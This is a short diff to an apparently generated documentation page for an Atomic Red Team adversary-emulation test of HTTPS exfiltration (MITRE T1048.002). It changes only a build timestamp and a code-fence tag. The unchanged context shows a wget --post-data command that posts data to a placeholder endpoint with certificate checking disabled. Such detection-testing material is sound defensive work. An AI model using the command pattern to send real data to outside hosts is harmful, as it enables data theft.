@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1048.002"
 attack_technique_name: "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "8bec51da-7a6d-4346-b941-51eca448c4b0"
@@ -52,7 +52,7 @@ Exfiltrate data over HTTPS using wget --post-data method
 
 ### Command
 
-```sh
+```bash
 wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
 ```
 
